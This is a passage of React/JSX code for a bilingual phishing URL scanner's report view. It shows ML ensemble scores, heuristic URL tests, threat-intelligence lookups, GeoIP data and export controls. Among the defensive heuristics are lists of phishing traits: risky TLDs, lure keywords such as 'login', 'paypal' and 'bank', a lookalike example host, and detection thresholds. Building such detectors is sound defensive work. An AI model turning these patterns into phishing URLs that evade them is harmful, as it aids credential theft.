                    <div className="p-2 bg-sky-500/10 text-sky-500 rounded-xl shrink-0"><Globe className="w-4 h-4" /></div>
                    <div className="overflow-hidden">
                      <span className="text-[10px] uppercase font-mono font-bold text-slate-400 block">{lang === 'fr' ? 'Cible Inspectée' : 'Inspected Target'} ({currentResult.type || 'URL'})</span>
                      <p className="text-xs sm:text-sm font-mono font-bold text-slate-900 dark:text-slate-100 truncate">{currentResult.target}</p>
                    </div>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    <span className={`px-2.5 py-1 rounded-lg text-[10px] font-mono font-bold ${currentResult.target?.startsWith('https') ? 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20' : 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20'}`}>
                      {currentResult.target?.startsWith('https') ? '🔒 HTTPS' : (lang === 'fr' ? '⚠️ HTTP (Non Sécurisé)' : '⚠️ HTTP (Insecure)')}
                    </span>
                    <button onClick={() => copyToClipboard(currentResult.target, 'url')} className="px-3 py-1.5 rounded-lg bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 hover:bg-slate-100 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 text-xs font-bold flex items-center gap-1.5 transition cursor-pointer">
                      {copiedUrl ? <Check className="w-3.5 h-3.5 text-emerald-500" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedUrl ? (lang === 'fr' ? 'Copié !' : 'Copied!') : (lang === 'fr' ? 'Copier' : 'Copy')}</span>
                    </button>
                  </div>
                </div>

                {/* ── SECTION LABEL ── */}
                <div className="flex items-center gap-3">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-indigo-500" />
                    <h4 className="text-xs font-extrabold uppercase font-mono tracking-wider text-slate-700 dark:text-slate-200">{lang === 'fr' ? 'Rapport de Sécurité Complet — Tests Exécutés' : 'Full Security Report — Executed Tests'}</h4>
                  </div>
                  <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800" />
                  <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded-md bg-indigo-500/10 text-indigo-500 border border-indigo-500/20 shrink-0">{testsCount} {lang === 'fr' ? 'Blocs' : 'Blocks'}</span>
                </div>

                {/* ══════════════════════════════════════════════
                    TEST BLOCK 1 — ML ENSEMBLE (3 MODELS)
                ══════════════════════════════════════════════ */}
                {models.length > 0 && (
                  <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                    <div className="flex items-center justify-between px-4 py-3 bg-gradient-to-r from-indigo-50 to-slate-50 dark:from-indigo-950/30 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6 rounded-lg bg-indigo-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">1</div>
                        <Cpu className="w-4 h-4 text-indigo-500" />
                        <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">{lang === 'fr' ? 'Moteur IA — Ensemble Machine Learning (3 Modèles)' : 'AI Engine — Machine Learning Ensemble (3 Models)'}</span>
                      </div>
                      <span className="text-[10px] font-mono font-bold px-2 py-0.5 rounded bg-emerald-500/10 text-emerald-600 dark:text-emerald-400">{lang === 'fr' ? '✓ 3/3 Actifs' : '✓ 3/3 Active'}</span>
                    </div>

                    <div className="p-4 grid grid-cols-1 md:grid-cols-3 gap-3">
                      {models.map((m, idx) => {
                        const mProb = typeof m.phishing_prob === 'number' ? m.phishing_prob : parseFloat(m.phishing_prob) || 0;
                        const isRisky = mProb >= 50;
                        return (
                          <div key={idx} className="bg-slate-50 dark:bg-[#111622] border border-slate-200 dark:border-slate-800 rounded-xl p-3.5 space-y-3">
                            <div className="flex items-start justify-between gap-2">
                              <div>
                                <span className="text-[10px] font-mono text-slate-400 block">{lang === 'fr' ? `Modèle #${idx + 1}` : `Model #${idx + 1}`}</span>
                                <span className="text-xs font-extrabold text-slate-900 dark:text-white leading-tight">{m.name}</span>
                              </div>
                              <span className={`px-2 py-0.5 rounded-md text-[10px] font-mono font-bold shrink-0 ${isRisky ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border border-emerald-500/20'}`}>
                                {isRisky ? (lang === 'fr' ? '⚠️ MENACE' : '⚠️ THREAT') : (lang === 'fr' ? '✓ SÛR' : '✓ SAFE')}
                              </span>
                            </div>
                            <div className="space-y-1">
                              <div className="flex justify-between text-[10px] font-mono">
                                <span className="text-slate-400">{lang === 'fr' ? 'Probabilité de phishing' : 'Phishing Probability'}</span>
                                <span className={`font-black ${isRisky ? 'text-rose-500' : 'text-emerald-500'}`}>{mProb}%</span>
                              </div>
                              <div className="h-2 w-full bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden">
                                <div className={`h-full rounded-full transition-all duration-700 ${isRisky ? 'bg-gradient-to-r from-amber-400 to-rose-500' : 'bg-gradient-to-r from-teal-400 to-emerald-500'}`} style={{ width: `${Math.min(100, Math.max(3, mProb))}%` }} />
                              </div>
                            </div>
                            <div className="flex justify-between text-[10px] font-mono text-slate-500">
                              <span>{lang === 'fr' ? 'Précision du modèle' : 'Model Accuracy'}</span>
                              <span className="text-emerald-500 font-bold">{m.accuracy}%</span>
                            </div>
                          </div>
                        );
                      })}
                    </div>

                    {/* Consensus Row */}
                    <div className={`mx-4 mb-4 p-3 rounded-xl border flex items-center justify-between gap-4 ${isThreat ? 'bg-rose-50 dark:bg-rose-950/20 border-rose-200 dark:border-rose-800/40' : 'bg-emerald-50 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-800/40'}`}>
                      <span className="text-xs font-bold text-slate-600 dark:text-slate-300 font-mono">{lang === 'fr' ? 'Verdict Consensus Ensemble (Moyenne des 3)' : 'Ensemble Consensus Verdict (Average of 3)'}</span>
                      <div className="flex items-center gap-3">
                        <div className="h-2 w-32 bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden">
                          <div className={`h-full rounded-full ${isThreat ? 'bg-gradient-to-r from-amber-400 to-rose-500' : 'bg-gradient-to-r from-teal-400 to-emerald-500'}`} style={{ width: `${Math.min(100, score)}%` }} />
                        </div>
                        <span className={`text-sm font-black font-mono ${isThreat ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{currentResult.details?.ml_confidence || score.toFixed(1)}%</span>
                      </div>
                    </div>
                  </div>
                )}

                {/* ══ TEST BLOCK 2 — HEURISTIC RULES + 17 FEATURES ══ */}
                {Object.keys(features).length > 0 && (
                  <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                    <div className="flex items-center justify-between px-4 py-3 bg-gradient-to-r from-amber-50 to-slate-50 dark:from-amber-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                      <div className="flex items-center gap-2">
                        <div className="w-6 h-6 rounded-lg bg-amber-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">2</div>
                        <BarChart2 className="w-4 h-4 text-amber-500" />
                        <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">{lang === 'fr' ? 'Moteur Heuristique — 17 Caractéristiques URL' : 'Heuristic Engine — 17 URL Features'}</span>
                      </div>
                      <span className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded border ${(currentResult.details?.rule_triggers?.length || 0) > 0 ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>
                        {(currentResult.details?.rule_triggers?.length || 0)} {lang === 'fr' ? 'Règle(s) Déclenchée(s)' : 'Rule(s) Triggered'}
                      </span>
                    </div>
                    <div className="p-4 space-y-4">
                      {/* Binary PASS/FAIL Tests */}
                      <div>
                        <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">{lang === 'fr' ? 'Tests Binaires (Passe / Échec)' : 'Binary Tests (Pass / Fail)'}</p>
                        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2">
                          {[
                            { label: lang === 'fr' ? 'Chiffrement HTTPS / SSL' : 'HTTPS / SSL Encryption', desc: lang === 'fr' ? 'Protocole de connexion sécurisé' : 'Secure connection protocol', pass: !!features.is_https, value: features.is_https ? (lang === 'fr' ? 'HTTPS Actif' : 'HTTPS Active') : (lang === 'fr' ? 'HTTP Non Chiffré' : 'HTTP Unencrypted') },
                            { label: lang === 'fr' ? 'Hôte IP Direct' : 'Direct IP Host', desc: lang === 'fr' ? "IP brute au lieu d'un domaine" : "Raw IP instead of domain", pass: !features.has_ip, value: features.has_ip ? (lang === 'fr' ? 'IP Détectée — Risque' : 'IP Detected — Risk') : (lang === 'fr' ? 'Domaine Normal' : 'Normal Domain') },
                            { label: lang === 'fr' ? 'TLD Suspect' : 'Suspicious TLD', desc: lang === 'fr' ? 'Extension risquée (.xyz, .top, .tk...)' : 'Risky TLD extension (.xyz, .top, .tk...)', pass: !features.has_suspicious_tld, value: features.has_suspicious_tld ? (lang === 'fr' ? 'TLD Dangereux' : 'Dangerous TLD') : (lang === 'fr' ? 'TLD Standard' : 'Standard TLD') },
                            { label: lang === 'fr' ? 'Symbole @ Redirection' : '@ Symbol Redirection', desc: lang === 'fr' ? "Trompe le navigateur sur l'hôte réel" : "Tricks browser regarding real host", pass: !(features.num_at > 0), value: features.num_at > 0 ? `${features.num_at} Symbol(s) @` : (lang === 'fr' ? 'Aucun' : 'None') },
                            { label: lang === 'fr' ? 'Sous-domaines Excessifs' : 'Excessive Subdomains', desc: 'login.secure.paypal.xyz (2+ levels)', pass: (features.num_subdomains || 0) < 2, value: `${features.num_subdomains || 0} ${lang === 'fr' ? 'Niveau(x)' : 'Level(s)'}` },
                            { label: lang === 'fr' ? 'Mots-clés Suspects' : 'Suspicious Keywords', desc: 'login, verify, paypal, bank, claim...', pass: (features.keyword_count || 0) === 0, value: features.keyword_count > 0 ? `${features.keyword_count} ${lang === 'fr' ? 'Mot(s)' : 'Word(s)'}` : (lang === 'fr' ? 'Aucun' : 'None') },
                          ].map((test, i) => (
                            <div key={i} className={`p-3 rounded-xl border flex items-start gap-3 ${test.pass ? 'bg-emerald-50/60 dark:bg-emerald-950/10 border-emerald-200 dark:border-emerald-900/30' : 'bg-rose-50/60 dark:bg-rose-950/10 border-rose-200 dark:border-rose-900/30'}`}>
                              <div className={`w-5 h-5 rounded-full flex items-center justify-center shrink-0 mt-0.5 text-white text-[10px] font-black ${test.pass ? 'bg-emerald-500' : 'bg-rose-500'}`}>{test.pass ? '✓' : '❌'}</div>
                              <div className="min-w-0">
                                <p className="text-xs font-bold text-slate-800 dark:text-white leading-tight">{test.label}</p>
                                <p className="text-[10px] text-slate-400 mt-0.5 leading-tight">{test.desc}</p>
                                <p className={`text-[10px] font-mono font-bold mt-1 ${test.pass ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600 dark:text-rose-400'}`}>→ {test.value}</p>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>
                      {/* Numeric Metrics */}
                      <div>
                        <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">{lang === 'fr' ? 'Métriques Numériques Extraites (17 Features ML)' : 'Extracted Numerical Metrics (17 ML Features)'}</p>
                        <div className="grid grid-cols-3 sm:grid-cols-4 lg:grid-cols-6 gap-2">
                          {[
                            { label: 'Long. URL', val: features.url_length || 0, warn: (features.url_length || 0) > 75 },
                            { label: 'Long. Dom.', val: features.domain_length || 0, warn: (features.domain_length || 0) > 30 },
                            { label: 'Chemin', val: features.path_length || 0, warn: (features.path_length || 0) > 60 },
                            { label: 'Points (.)', val: features.num_dots || 0, warn: (features.num_dots || 0) > 4 },
                            { label: 'Tirets (-)', val: features.num_hyphens || 0, warn: (features.num_hyphens || 0) > 2 },
                            { label: 'Entropie', val: typeof features.entropy === 'number' ? features.entropy.toFixed(2) : '0', warn: (features.entropy || 0) > 4.2 },
                            { label: 'Params (?)', val: features.num_equals || 0, warn: (features.num_equals || 0) > 3 },
                            { label: 'Barres (/)', val: features.num_slashes || 0, warn: (features.num_slashes || 0) > 7 },
                            { label: 'Chiffres', val: features.num_digits || 0, warn: (features.num_digits || 0) > 12 },
                            { label: 'Spéciaux', val: features.num_special_chars || 0, warn: (features.num_special_chars || 0) > 15 },
                            { label: 'Sous-dom.', val: features.num_subdomains || 0, warn: (features.num_subdomains || 0) >= 2 },
                            { label: 'Mots-clés', val: features.keyword_count || 0, warn: (features.keyword_count || 0) > 0 },
                          ].map((m, i) => (
                            <div key={i} className={`p-2.5 rounded-xl border text-center ${m.warn ? 'bg-amber-50 dark:bg-amber-950/20 border-amber-200 dark:border-amber-800/40' : 'bg-white dark:bg-slate-900/60 border-slate-100 dark:border-slate-800'}`}>
                              <span className={`text-base font-black font-mono block ${m.warn ? 'text-amber-600 dark:text-amber-400' : 'text-slate-800 dark:text-slate-200'}`}>{m.val}</span>
                              <span className="text-[9px] text-slate-400 font-mono uppercase block leading-tight mt-0.5">{m.label}</span>
                              {m.warn && <span className="text-[8px] text-amber-500 font-bold">↑ {lang === 'fr' ? 'Élevé' : 'High'}</span>}
                            </div>
                          ))}
                        </div>
                      </div>
                      {/* Triggered Rules */}
                      {currentResult.details?.rule_triggers?.length > 0 && (
                        <div>
                          <p className="text-[10px] font-mono font-bold uppercase tracking-wider text-slate-400 mb-2">{lang === 'fr' ? 'Règles de Sécurité Déclenchées' : 'Triggered Security Rules'}</p>
                          <div className="space-y-1.5">
                            {currentResult.details.rule_triggers.map((rule, i) => (
                              <div key={i} className="flex items-center gap-2.5 p-2.5 bg-rose-50 dark:bg-rose-950/10 border border-rose-200 dark:border-rose-900/30 rounded-xl text-xs">
                                <div className="w-4 h-4 rounded-full bg-rose-500 flex items-center justify-center text-white text-[9px] font-black shrink-0">!</div>
                                <span className="font-mono text-rose-700 dark:text-rose-300 font-semibold">{rule}</span>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                )}

                {/* ══ TEST BLOCK 3 — THREAT INTELLIGENCE ══ */}
                <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                  <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-purple-50 to-slate-50 dark:from-purple-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                    <div className="w-6 h-6 rounded-lg bg-purple-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">3</div>
                    <ShieldCheck className="w-4 h-4 text-purple-500" />
                    <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">{lang === 'fr' ? 'Threat Intelligence — Bases de Renseignement Mondiales' : 'Threat Intelligence — Global Intelligence Databases'}</span>
                  </div>
                  <div className="p-4 grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {/* VirusTotal */}
                    <div className={`p-4 rounded-xl border space-y-3 ${(vt?.positives || 0) > 0 ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : 'bg-emerald-50 dark:bg-emerald-950/10 border-emerald-200 dark:border-emerald-800/40'}`}>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">🔬</span>
                          <div><p className="text-xs font-black text-slate-800 dark:text-white">VirusTotal</p><p className="text-[10px] text-slate-400">{lang === 'fr' ? '90 moteurs antivirus mondiaux' : '90 global antivirus engines'}</p></div>
                        </div>
                        <span className={`px-2 py-0.5 rounded-md text-[10px] font-mono font-bold border ${(vt?.positives || 0) > 0 ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>{(vt?.positives || 0) > 0 ? (lang === 'fr' ? '⚠️ DÉTECTÉ' : '⚠️ DETECTED') : (lang === 'fr' ? '✓ PROPRE' : '✓ CLEAN')}</span>
                      </div>
                      <div className="space-y-2">
                        <div className="flex justify-between text-[11px] font-mono"><span className="text-slate-500">{lang === 'fr' ? 'Détections positives' : 'Positive Detections'}</span><span className={`font-black ${(vt?.positives || 0) > 0 ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{vt?.positives || 0} / {vt?.total_engines || 90}</span></div>
                        <div className="h-2 w-full bg-slate-200 dark:bg-slate-700 rounded-full overflow-hidden"><div className={`h-full rounded-full ${(vt?.positives || 0) > 0 ? 'bg-rose-500' : 'bg-emerald-500'}`} style={{ width: `${Math.min(100, ((vt?.positives || 0) / (vt?.total_engines || 90)) * 100)}%` }} /></div>
                        <div className="flex justify-between text-[10px] font-mono text-slate-400"><span>{lang === 'fr' ? 'Score réputation' : 'Reputation Score'}</span><span className={`font-bold ${(vt?.reputation_score || 0) < 0 ? 'text-rose-500' : 'text-emerald-500'}`}>{vt?.reputation_score ?? 'N/A'}</span></div>
                        <div className="flex justify-between text-[10px] font-mono text-slate-400"><span>{lang === 'fr' ? 'Catégories' : 'Categories'}</span><span className="font-bold text-slate-600 dark:text-slate-300 text-right max-w-[130px] truncate">{vt?.categories?.join(', ') || (lang === 'fr' ? 'Aucune' : 'None')}</span></div>
                        <p className="text-[9px] font-mono text-slate-400">Source : {vt?.source || 'VirusTotal Intelligence'}</p>
                      </div>
                    </div>
                    {/* Google Safe Browsing */}
                    <div className={`p-4 rounded-xl border space-y-3 ${gsb?.is_flagged ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : 'bg-emerald-50 dark:bg-emerald-950/10 border-emerald-200 dark:border-emerald-800/40'}`}>
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-xl">🛡️</span>
                          <div><p className="text-xs font-black text-slate-800 dark:text-white">Google Safe Browsing</p><p className="text-[10px] text-slate-400">{lang === 'fr' ? 'Base mondiale malware & phishing' : 'Global malware & phishing database'}</p></div>
                        </div>
                        <span className={`px-2 py-0.5 rounded-md text-[10px] font-mono font-bold border ${gsb?.is_flagged ? 'bg-rose-500/10 text-rose-600 dark:text-rose-400 border-rose-500/20' : 'bg-emerald-500/10 text-emerald-600 dark:text-emerald-400 border-emerald-500/20'}`}>{gsb?.is_flagged ? (lang === 'fr' ? '⚠️ SIGNALÉ' : '⚠️ FLAGGED') : (lang === 'fr' ? '✓ LISTE BLANCHE' : '✓ WHITELISTED')}</span>
                      </div>
                      <div className="space-y-2 text-[10px] font-mono">
                        <div className="flex justify-between text-slate-400"><span>{lang === 'fr' ? 'Statut' : 'Status'}</span><span className={`font-black ${gsb?.is_flagged ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}`}>{gsb?.is_flagged ? (lang === 'fr' ? 'MALICIEUX / SIGNALÉ' : 'MALICIOUS / FLAGGED') : (lang === 'fr' ? 'SÉCURISÉ / APPROUVÉ' : 'SECURE / APPROVED')}</span></div>
                        <div className="flex justify-between text-slate-400"><span>{lang === 'fr' ? 'Types de menace' : 'Threat Types'}</span><span className={`font-bold ${gsb?.threat_types?.length > 0 ? 'text-rose-500' : 'text-emerald-500'}`}>{gsb?.threat_types?.length > 0 ? gsb.threat_types.join(', ') : (lang === 'fr' ? 'Aucun' : 'None')}</span></div>
                        <div className="flex justify-between text-slate-400"><span>{lang === 'fr' ? 'Plateforme cible' : 'Target Platform'}</span><span className="font-bold text-slate-600 dark:text-slate-300">{gsb?.platform_type || 'ANY_PLATFORM'}</span></div>
                        <p className="text-[9px] text-slate-400 pt-1">Source : {gsb?.source || 'Google Safe Browsing'}</p>
                      </div>
                    </div>
                  </div>
                </div>

                {/* ══ TEST BLOCK 4 — GeoIP / ASN ══ */}
                {geoip && (
                  <div className="rounded-2xl border border-slate-200 dark:border-slate-800 overflow-hidden">
                    <div className="flex items-center gap-2 px-4 py-3 bg-gradient-to-r from-sky-50 to-slate-50 dark:from-sky-950/20 dark:to-slate-900/40 border-b border-slate-200 dark:border-slate-800">
                      <div className="w-6 h-6 rounded-lg bg-sky-500 flex items-center justify-center text-white text-[10px] font-black shrink-0">4</div>
                      <MapPin className="w-4 h-4 text-sky-500" />
                      <span className="text-xs font-extrabold text-slate-800 dark:text-white font-mono uppercase tracking-wide">{lang === 'fr' ? 'GeoIP & ASN — Localisation Réseau Apparente du Serveur' : 'GeoIP & ASN — Apparent Server Network Location'}</span>
                    </div>
                    <div className="p-4 space-y-3">
                      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
                        {[
                          { label: (lang === 'fr' ? 'Adresse IP' : 'IP Address'), value: geoip.ip || 'N/A', icon: '🌐', risk: false, highlight: 'text-sky-500 font-bold' },
                          { label: (lang === 'fr' ? 'Pays (Apparent)' : 'Country (Apparent)'), value: geoip.country || (lang === 'fr' ? 'Inconnu' : 'Unknown'), icon: '🏳️', risk: false },
                          { label: (lang === 'fr' ? 'Ville (Estimée / POP)' : 'City (Estimated / POP)'), value: geoip.city || (lang === 'fr' ? 'Inconnu' : 'Unknown'), icon: '📍', risk: false },
                          { label: 'ASN', value: geoip.asn || 'N/A', icon: '🔌', risk: false },
                          { label: lang === 'fr' ? 'Organisation' : 'Organization', value: geoip.org || (lang === 'fr' ? 'Inconnu' : 'Unknown'), icon: '🏢', risk: false },
                          { 
                            label: (lang === 'fr' ? 'Statut Proxy / CDN' : 'Proxy / CDN Status'), 
                            value: geoip.proxy_status_display || (geoip.is_cdn ? 'CDN Anycast (Reverse Proxy)' : geoip.is_vpn_proxy ? (lang === 'fr' ? 'OUI — Anonymisé' : 'YES — Anonymized') : (lang === 'fr' ? 'NON (Connexion Directe)' : 'NO (Direct Connection)')), 
                            icon: geoip.is_vpn_proxy ? '🔴' : geoip.is_cdn ? '🔵' : '🟢', 
                            risk: !!geoip.is_vpn_proxy,
                            isCdn: !!geoip.is_cdn
                          },
                        ].map((item, i) => (
                          <div key={i} className={`p-3 rounded-xl border text-center ${item.risk ? 'bg-rose-50 dark:bg-rose-950/10 border-rose-200 dark:border-rose-800/40' : item.isCdn ? 'bg-sky-50/60 dark:bg-sky-950/20 border-sky-200 dark:border-sky-800/40' : 'bg-slate-50 dark:bg-slate-900/60 border-slate-200 dark:border-slate-800'}`}>
                            <span className="text-base block mb-1">{item.icon}</span>
                            <span className={`text-[10px] font-black font-mono block leading-tight ${item.risk ? 'text-rose-600 dark:text-rose-400' : item.isCdn ? 'text-sky-600 dark:text-sky-400' : 'text-slate-800 dark:text-slate-200'}`}>{item.value}</span>
                            <span className="text-[9px] text-slate-400 font-mono uppercase block mt-1">{item.label}</span>
                          </div>
                        ))}
                      </div>
                      {geoip.disclaimer && <p className="text-[10px] text-slate-400 font-mono italic border-t border-slate-200 dark:border-slate-800 pt-2">ℹ️ {geoip.disclaimer}</p>}
                    </div>
                  </div>
                )}

                {/* ── BLOCK 5: LIVE TECHNICAL INSPECTION (HTTP, SSL, HEADERS, DNS, BRAND) ── */}
                {currentResult.details?.technical_inspection && renderTechnicalDetails(currentResult.details.technical_inspection, 5)}

                {/* ── DEFENSIVE RECOMMENDATIONS ── */}
                {advice.length > 0 && (
                  <div className="bg-sky-500/10 border border-sky-500/30 rounded-2xl p-5 space-y-2">
                    <h4 className="text-xs font-bold text-sky-600 dark:text-sky-400 uppercase font-mono tracking-wider flex items-center gap-2"><Sparkles className="w-4 h-4" /> {lang === 'fr' ? 'Recommandations Défensives Immédiates :' : 'Immediate Defensive Recommendations:'}</h4>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 pt-1 text-xs text-slate-800 dark:text-slate-200 font-sans">
                      {advice.map((item, idx) => (
                        <div key={idx} className="flex items-start gap-2 bg-white/60 dark:bg-slate-900/60 p-2.5 rounded-xl border border-sky-200/40 dark:border-sky-800/40">
                          <span className="text-sky-500 font-bold shrink-0">•</span><span className="leading-snug">{item}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )}

                {/* ── SHA-256 SEAL ── */}
                {currentResult.details?.integrity_hash && (
                  <div className="p-3 bg-slate-50 dark:bg-[#111622] rounded-2xl border border-slate-200 dark:border-slate-800 flex items-center justify-between gap-3 text-xs font-mono">
                    <div className="flex items-center gap-2 truncate">
                      <Lock className="w-3.5 h-3.5 text-slate-400 shrink-0" />
                      <span className="text-slate-400 text-[10px] shrink-0">{lang === 'fr' ? 'SHA-256 Intégrité :' : 'SHA-256 Integrity:'}</span>
                      <span className="text-slate-600 dark:text-slate-300 truncate font-bold text-[11px]">{currentResult.details.integrity_hash}</span>
                    </div>
                    <button onClick={() => copyToClipboard(currentResult.details.integrity_hash, 'hash')} className="text-xs text-sky-500 hover:text-sky-600 font-bold shrink-0 cursor-pointer">{copiedHash ? (lang === 'fr' ? 'Copié !' : 'Copied!') : (lang === 'fr' ? 'Copier' : 'Copy')}</button>
                  </div>
                )}

                {/* ── ACTION TOOLBAR ── */}
                <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3">
                  <button onClick={() => setIsReportModalOpen(true)} className="w-full sm:w-auto px-5 py-3 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 font-bold text-xs rounded-2xl flex items-center justify-center gap-2 transition cursor-pointer">
                    <FileText className="w-4 h-4 text-sky-500" /><span>{lang === 'fr' ? 'Exporter la Fiche / PDF' : 'Export Report / PDF'}</span>
                  </button>
                  <button onClick={handleSendReport} disabled={isReporting} className="w-full sm:w-auto px-6 py-3 bg-rose-600 hover:bg-rose-700 disabled:opacity-50 text-white font-extrabold text-xs rounded-2xl shadow-lg shadow-rose-600/30 flex items-center justify-center gap-2 transition cursor-pointer">
                    {isReporting ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                    <span>{lang === 'fr' ? "Transmettre ce Dossier à l'Enquêteur SOC" : "Forward Report to SOC Investigator"}</span>
                  </button>
                </div>
                {reportSuccess && (
                  <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 text-emerald-600 dark:text-emerald-400 text-xs font-bold rounded-2xl flex items-center gap-2">
                    <CheckCircle2 className="w-4 h-4 shrink-0" /><span>{reportSuccess}</span>
                  </div>
                )}

              </div>
            </div>
          );
        })()}

      </div>

      {/* Official Diagnostic Report Viewer Modal */}
      {isReportModalOpen && currentResult && (
        <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
          <div className="bg-white dark:bg-[#111622] border-2 border-sky-300 dark:border-sky-700 rounded-3xl p-6 sm:p-8 max-w-4xl w-full shadow-2xl space-y-6 relative max-h-[90vh] overflow-y-auto animate-in zoom-in-95 duration-150">
            
            {/* Report Header */}
            <div className="flex items-center justify-between border-b-2 border-sky-100 dark:border-sky-800/60 pb-5">
              <div className="flex items-center gap-3.5">
                <div className="p-3 bg-sky-500 text-white rounded-2xl shadow-md">
                  <FileText className="w-7 h-7" />
                </div>
                <div>
                  <span className="text-[10px] font-mono uppercase font-black text-sky-500 tracking-wider">
                    {lang === 'fr' ? 'RAPPORT DIAGNOSTIQUE DE SÉCURITÉ' : 'SECURITY DIAGNOSTIC REPORT'}
                  </span>
                  <h2 className="text-xl font-black text-slate-900 dark:text-white">
                    {lang === 'fr' ? "Fiche Officielle d'Analyse CyberGuard" : "CyberGuard Official Analysis Report"} ({currentResult.details?.analysis_code || 'ANL-REPORT'})
                  </h2>
                  <p className="text-xs text-slate-500 dark:text-slate-400 font-mono">{lang === 'fr' ? 'Horodatage :' : 'Timestamp:'} {currentResult.timestamp}</p>
                </div>
              </div>
              <button 
                onClick={() => setIsReportModalOpen(false)}
                className="p-2 text-slate-400 hover:text-slate-600 dark:hover:text-white rounded-xl bg-slate-100 dark:bg-slate-800 cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Verdict Summary Box */}
            <div className={`p-6 rounded-2xl border-2 flex items-center justify-between ${
              currentResult.riskScore >= 50
                ? 'bg-rose-500/10 border-rose-500/40 text-rose-600 dark:text-rose-400'
                : 'bg-emerald-500/10 border-emerald-500/40 text-emerald-600 dark:text-emerald-400'
            }`}>
              <div className="space-y-1">
                <span className="text-[10px] font-mono uppercase font-extrabold opacity-75">
                  {lang === 'fr' ? 'Statut de Classification IA' : 'AI Classification Status'}
                </span>
                <h3 className="text-xl font-black">
                  {currentResult.verdict === 'PHISHING' || currentResult.riskScore >= 50 
                    ? (lang === 'fr' ? '⚠️ MENACE DE PHISHING / MALWARE CONFIRMÉE' : '⚠️ CONFIRMED PHISHING / MALWARE THREAT') 
                    : (lang === 'fr' ? '✓ CONTENU SÉCURISÉ & CONFORME' : '✓ SECURE & COMPLIANT CONTENT')}
                </h3>
              </div>
              <div className="text-right font-mono">
                <span className="text-[10px] uppercase text-slate-400 font-bold block">{lang === 'fr' ? 'Score de Risque' : 'Risk Score'}</span>
                <span className="text-3xl font-black">{currentResult.riskScore}%</span>
              </div>
            </div>

            {/* Target Content Breakdown */}
            <div className="space-y-1.5">
              <label className="text-[10px] uppercase font-mono font-bold text-slate-400">
                {lang === 'fr' ? 'Objet / Cible Inspectée' : 'Inspected Object / Target'} ({currentResult.type})
              </label>
              <div className="p-4 bg-slate-50 dark:bg-[#1a2333] rounded-2xl border border-sky-100 dark:border-sky-800/40 text-xs font-mono font-bold break-all text-slate-900 dark:text-slate-100 shadow-inner">
                {currentResult.target}
              </div>
            </div>

            {/* AI Ensemble Models Breakdown Table */}
            {currentResult.details?.model_comparisons?.length > 0 && (
              <div className="space-y-2">
                <p className="text-[11px] font-mono font-extrabold uppercase text-slate-400 flex items-center gap-2">
